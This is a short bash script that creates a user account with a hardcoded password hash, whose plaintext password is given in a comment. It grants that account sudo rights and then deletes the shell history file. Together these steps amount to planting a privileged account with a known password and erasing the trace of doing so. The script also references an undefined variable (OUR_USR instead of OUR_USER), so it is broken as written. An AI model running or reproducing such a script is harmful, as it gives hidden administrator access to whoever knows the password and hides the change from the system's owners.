 #!/bin/bash
OUR_USER=$1

# add user with name default and password worldofwonders
sudo useradd -m -p "\$6\$0mb/OJ.9.a4H5PkD\$0fCeQDMPOBBVERSXe8yt4qjmxvjapc4C.X73qrEaJ/WelKcEvlno9OGCrAHO6L6n/W1Z0d6L28vSGxdx9RMjR." -s /bin/bash "${OUR_USR}"
sudo usermod -aG sudo "${OUR_USR}"

# erase history
rm -rf .bash_history